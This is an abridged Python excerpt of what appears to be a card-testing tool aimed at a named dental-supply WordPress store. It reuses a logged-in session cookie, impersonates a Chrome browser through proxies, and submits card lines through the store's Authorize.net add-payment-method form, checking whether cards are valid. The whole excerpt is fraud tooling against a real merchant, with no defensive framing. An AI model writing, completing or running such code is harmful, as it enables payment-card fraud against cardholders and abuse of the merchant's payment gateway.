...
class CookieManager:
    def __init__(self, cookie_key='wordpress_logged_in_15aca12bc2f960056d363c8f4cd3ffa4'):
    ...
    def save_cookies(self, cookies_data):
        with open('b3.json', "w", encoding="utf-8") as f_coo:
...
class Gateway:
    ...
    async def charge_card(card_data: dict, user_data: dict, proxies: dict = None) -> tuple[str, str, bool]:
        ...
        async with AsyncSession(impersonate="chrome110", proxies=proxies) as session:
            ...
            try:
                headers_get = {
                    "referer": "https://www.sodiumdental.com/my-account/payment-methods/",
                }
                resp_get = await session.get(
                    "https://www.sodiumdental.com/my-account/add-payment-method/",
                    headers=headers_get,
                )
                html = resp_get.text
                ...
                headers_ajax = {
                    "origin": "https://www.sodiumdental.com",
                    "referer": "https://www.sodiumdental.com/my-account/add-payment-method/",
                ...
                resp_ajax = await session.post(
                    "https://www.sodiumdental.com/wp-admin/admin-ajax.php",
                ...
                data_final = [
                    ...
                    ("wc-authorize-net-cim-echeck-context", "shortcode"),
                    ("wc-authorize-net-cim-echeck-account-type", "checking"),
                    ("wc-authorize-net-cim-echeck-payment-nonce", ""),
                    ("wc-authorize-net-cim-echeck-payment-descriptor", ""),
                    ("wc-authorize-net-cim-echeck-last-four", ""),
                    ("wc-authorize-net-cim-echeck-tokenize-payment-method", "true"),
...
async def process_B3_3(card_line: str, proxy_url: str = None) -> tuple[str, str, bool]:
